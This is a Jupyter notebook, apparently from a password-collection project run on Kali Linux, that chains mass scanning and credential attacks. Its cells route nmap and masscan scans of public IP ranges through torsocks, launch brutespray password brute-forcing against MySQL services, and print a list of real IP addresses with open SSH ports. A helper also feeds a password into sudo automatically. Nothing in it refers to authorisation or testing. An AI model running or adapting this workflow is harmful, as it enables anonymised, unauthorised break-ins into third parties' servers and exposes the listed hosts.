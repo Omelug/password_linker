{
 "cells": [
  {
   "metadata": {},
   "cell_type": "code",
   "source": "!ROOT=\"../../\"",
   "id": "40d507a79cb116b8",
   "outputs": [],
   "execution_count": null
  },
  {
   "metadata": {},
   "cell_type": "code",
   "source": [
    "sudo ln -s /path/to/brutespray/main /usr/local/bin/brutespray\n",
    "\n",
    "#python tools\n",
    "cd /path/to/your/script\n",
    "chmod +x your_script.py\n",
    "ln -s /root/OpenSSH-Scanner/ssh.py /usr/local/bin/openssh_scanner\n",
    "which your_script"
   ],
   "id": "505c9d258e439304",
   "outputs": [],
   "execution_count": null
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2024-09-15T08:08:01.680362Z",
     "start_time": "2024-09-15T08:08:01.665807Z"
    }
   },
   "cell_type": "code",
   "source": [
    "import pexpect\n",
    "\n",
    "\n",
    "def run_command_with_sudo(command, password):\n",
    "    child = pexpect.spawn(f'sudo {command}')\n",
    "    child.expect('password for')\n",
    "    child.sendline(password)\n",
    "    child.expect(pexpect.EOF)\n",
    "    output = child.before.decode('utf-8')\n",
    "    return output"
   ],
   "id": "5230bca1a1b589a6",
   "outputs": [],
   "execution_count": 12
  },
  {
   "metadata": {},
   "cell_type": "markdown",
   "source": "## Scanners - nmap, brutespray",
   "id": "809c831d221f984"
  },
  {
   "metadata": {},
   "cell_type": "code",
   "source": [
    "#PREPARE SCAN FOLDER\n",
    "ROOT=\"../../\"\n",
    "!cat {ROOT}./script/scanner/scans/default_lists/ip.txt | python3 {ROOT}pass_hub.py change_format.py --in_format IP_TXT --out_format SCAN_FOLDER "
   ],
   "id": "c6463392a1076859",
   "outputs": [],
   "execution_count": null
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2024-09-15T11:12:48.934139Z",
     "start_time": "2024-09-15T11:12:16.062262Z"
    }
   },
   "cell_type": "code",
   "source": [
    "#NMAP\n",
    "ROOT=\"../../\"\n",
    "!torsocks python3 {ROOT}pass_hub.py scanner.py --service mysql --nmap --time_limit 30m"
   ],
   "id": "96d6e56cb152cdba",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "INFO:root:--> scanner.py\r\n",
      "nmap 85.239.76.136/29 85.239.76.144/28 85.239.76.160/27 85.239.76.192/26 85.239.77.0/24 85.239.78.0/23 85.239.80.0/26 85.239.80.64/27 85.239.80.96/28 -p 3306 -oX /home/kali/Desktop/JetBrains/PyCharm/passwordList/./script/scanner/../../scans/chunks/e70278eb6995a8338b03f0e31b6d81d5/nmap_mysql.xml -T3\r\n",
      "Traceback (most recent call last):\r\n",
      "  File \"/home/kali/Desktop/JetBrains/PyCharm/passwordList/script/scanner/../../pass_hub.py\", line 101, in <module>\r\n",
      "    run_func(args=sys.argv,config=CONFIG)\r\n",
      "  File \"/home/kali/Desktop/JetBrains/PyCharm/passwordList/./script/scanner/scanner.py\", line 110, in run\r\n",
      "    if run_cmd(command, metadata, run_time, time_limit=ARGS.time_limit, metadata_path=metadata_path):\r\n",
      "       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n",
      "  File \"/home/kali/Desktop/JetBrains/PyCharm/passwordList/./script/scanner/scanner.py\", line 64, in run_cmd\r\n",
      "    subprocess.run(command, shell=True, capture_output=True, text=True)\r\n",
      "  File \"/usr/lib/python3.11/subprocess.py\", line 550, in run\r\n",
      "    stdout, stderr = process.communicate(input, timeout=timeout)\r\n",
      "                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n",
      "  File \"/usr/lib/python3.11/subprocess.py\", line 1209, in communicate\r\n",
      "    stdout, stderr = self._communicate(input, endtime, timeout)\r\n",
      "                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n",
      "  File \"/usr/lib/python3.11/subprocess.py\", line 2115, in _communicate\r\n",
      "    ready = selector.select(timeout)\r\n",
      "            ^^^^^^^^^^^^^^^^^^^^^^^^\r\n",
      "  File \"/usr/lib/python3.11/selectors.py\", line 415, in select\r\n",
      "    fd_event_list = self._selector.poll(timeout)\r\n",
      "                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n",
      "KeyboardInterrupt\r\n"
     ]
    }
   ],
   "execution_count": 38
  },
  {
   "metadata": {},
   "cell_type": "code",
   "source": [
    "#BRUTESPRAY\n",
    "ROOT=\"../../\"\n",
    "!torsocks python3 {ROOT}pass_hub.py scanner.py --brutespray --time_limit 30m --service mysql"
   ],
   "id": "435b41895ef6fbd6",
   "outputs": [],
   "execution_count": null
  },
  {
   "metadata": {},
   "cell_type": "markdown",
   "source": "## Masscan -get all ssh",
   "id": "2667c23e2693a7fa"
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2024-09-15T08:10:12.800226Z",
     "start_time": "2024-09-15T08:10:12.070375Z"
    }
   },
   "cell_type": "code",
   "source": [
    "ranges_str=\"\"\n",
    "output_file = \"ssh.json\"\n",
    "ports_str=\"22\"\n",
    "command=f\"torsocks masscan {ranges_str} -p{ports_str} --rate=1000 -oJ {output_file}\"\n",
    "!echo $command\n",
    "#!sudo $command\n",
    "#!cat $output_file\n",
    "run_command_with_sudo(command, \"\")"
   ],
   "id": "124c712785355353",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "torsocks masscan 45.134.226.157-45.134.226.157 -p22 --rate=1000 -oJ ssh.json\r\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "' kali: \\r\\nERROR:\\'wlan0\\': Bad file descriptor\\r\\n[-] FAIL: failed to detect IP of interface \"wlan0\"\\r\\n    [hint] did you spell the name correctly?\\r\\n    [hint] if it has no IP address, manually set with something like \"--source-ip 198.51.100.17\"\\r\\n'"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "execution_count": 14
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2024-09-15T08:51:11.023911Z",
     "start_time": "2024-09-15T08:51:10.902071Z"
    }
   },
   "cell_type": "code",
   "source": "!cat ./scans/test/ssh.masscan.out | awk '{print $6\":\"$4}' | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}:[0-9]+' | head -n 10",
   "id": "5c6384137a45a985",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "46.8.29.25:22\r\n",
      "46.8.31.240:22\r\n",
      "46.8.31.237:22\r\n",
      "46.8.29.198:22\r\n",
      "46.8.29.168:22\r\n",
      "46.8.29.48:22\r\n",
      "46.8.21.68:22\r\n",
      "46.8.29.122:22\r\n",
      "46.8.31.250:22\r\n",
      "46.8.31.181:22\r\n"
     ]
    }
   ],
   "execution_count": 35
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2024-09-15T08:51:35.131872Z",
     "start_time": "2024-09-15T08:51:35.120671Z"
    }
   },
   "cell_type": "code",
   "source": "#!python3 ssh.py -f targets.txt --output results.txt -t 3",
   "id": "bba4aff63fc19cb9",
   "outputs": [],
   "execution_count": 36
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
